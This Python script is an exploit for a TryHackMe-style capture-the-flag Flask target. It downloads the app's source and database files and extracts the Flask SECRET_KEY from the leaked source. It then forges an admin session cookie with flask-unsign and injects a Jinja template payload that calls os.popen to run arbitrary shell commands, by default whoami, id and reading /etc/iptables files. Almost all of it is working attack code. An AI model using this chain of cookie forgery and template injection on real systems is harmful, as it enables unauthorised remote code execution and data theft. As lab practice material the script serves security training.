#!/usr/bin/env python3
############################################################
# Important Note:
# This program requires flask-unsign to be installed on
# the attacker machine, otherwise the forgeCookie function
# will not work.
############################################################

import argparse
import base64
import json
import os
import platform
import random
import re
import requests
import string
import subprocess

class Drinker:
    def __init__(self, baseurl:str, defaultTimeout=None) -> None:
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl should be string. Got {type(baseurl)}")

        if defaultTimeout is None:
            defaultTimeout = 10
        elif not(isinstance(defaultTimeout,int)) and not(isinstance(defaultTimeout,float)):
            raise TypeError(f"DefaultTimeout should be int or float. Got {type(defaultTimeout)}")
        elif defaultTimeout <= 0:
            raise ValueError(f"DefaultTimeout must be a positive value")

        self.__baseurl = baseurl
        self.__targetfiles = {
                "": ["main.py"],
                "db": ["base.py", "auth.py", "stats.py"],
                "data": ["users.db", "stats.db"],
                "libs": ["auth.py"],
                "modules": ["admin.py"],
                "views": ["index.html"]
        }
        self.__timeout = defaultTimeout

        self.session = requests.Session()
        return

    def attackTemplate(self, command=None):
        message = str()
        success = bool()

        try:
            if command is None:
                command = "7*7"
            elif not(isinstance(command,str)):
                raise TypeError(f"Command must be a string. Got {type(command)}")

            targetroute = "admin"
            targeturl = f"{self.__baseurl}/{targetroute}"

            success, message = self.forgeCookie(f"""{{{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}}}""")
            if not(success):
                raise ValueError(message)

            resp = self.session.get(targeturl, verify=False, timeout=self.__timeout)
            if resp.status_code != 200:
                raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

            with open(targetroute, "wb") as fptr:
                fptr.write(resp.content)

            pattern = re.compile("Welcome,((.|\n)*)?<\\/span>")
            matches = pattern.findall(resp.text)
            if len(matches) > 0:
                print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
                print(f"{ANSI_GRN}{'Command Output':^60}{ANSI_RST}")
                print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
                print("".join(matches[0]).strip("\n").strip(" "))
                print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

            message = "admin source html successfully acquired"
            success = True
        except requests.exceptions.ReadTimeout:
            message = "read timeout envountered. check for reverse shell."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def forgeCookie(self, username=None):
        cookie = str()
        message = str()
        success = bool()

        try:
            if (username is None):
                username = "admin"
            elif not(isinstance(username,str)):
                raise TypeError(f"Username must be a string. Got {type(username)}")

            username = username.replace('"',"'").replace("'","""'"'"'""")

            cookie_values = f"{{\"auth\":\"True\", \"username\":\"{username}\"}}"

            secret, success, message = self.getSecret()
            if not(success):
                raise ValueError(message)

            command = f"flask-unsign -c '{str(cookie_values)}' --sign --secret {secret}"
            output = subprocess.check_output(command, shell=True).decode()[:-1]
            self.session.cookies.set("session", output)

            message = "admin cookie successfully forged"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def getInformation(self):
        message = str()
        numfiles = int()
        success = bool()
        targeturl = str()

        try:

            ############################################################
            # Loop through key-value pairs in targetfiles dict and
            # attempt to pull down the files and save them locally.
            #
            # The dict keys are the directories, and the values are
            # lists containing target files.
            ############################################################
            for directory,files in self.__targetfiles.items():
                for curfile in files:
                    targeturl = f"{self.__baseurl}/{directory}/{curfile}"
                    
                    resp = self.session.get(targeturl, timeout=self.__timeout, verify=False)
                    if resp.status_code != 200:
                        continue

                    localfile = f"{directory}_{curfile}"
                    with open(localfile,"wb") as fptr:
                        fptr.write(resp.content)

                    numfiles += 1

            message = f"{numfiles} successfully pulled down"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def getSecret(self):
        messsage = str()
        pattern = "SECRET_KEY\"\\] = \"([a-zA-Z0-9]+)\""
        secret = str()
        success = bool()
        targetfile = "_main.py"

        try:
            pat = re.compile(pattern)
            
            with open(targetfile,"r") as fptr:
                source_code = fptr.read()

            matches = pat.findall(source_code)

            if len(matches) < 1:
                raise ValueError("no secret discovered in source code")

            secret = matches[0]
            message = "secret successfully pulled"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (secret, success, message)

    def showCookie(self):
        message = str()
        success = bool()

        try:
            b64cookie = self.session.cookies.get("session").split(".")[0]

            if (len(b64cookie) % 4) != 0:
                padding = "=" * (4 - (len(b64cookie) % 4))
                b64cookie = f"{b64cookie}{padding}"

            b64decoded = base64.b64decode(b64cookie).decode()

            message = "cookie decoded and displayed"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("-t","--target", help="IP address of target.", type=str, default="hipper.hipflasks.thm", dest="target")
    parser.add_argument("-p","--port", help="Port to connect to target on.", type=port_type, default=443, dest="port")
    parser.add_argument("-c","--command", help="Command to inject into template", type=str, default="whoami;id;cat /etc/iptables/*", dest="command")

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    command = args.command

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    regular = Drinker(baseURL)

    success, message = regular.getInformation()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = regular.showCookie()
    if not(success):
        ErrMsg(message)
        exit(1)

    success, message = regular.forgeCookie()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = regular.attackTemplate(command)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    return

if __name__ == "__main__":
    main()

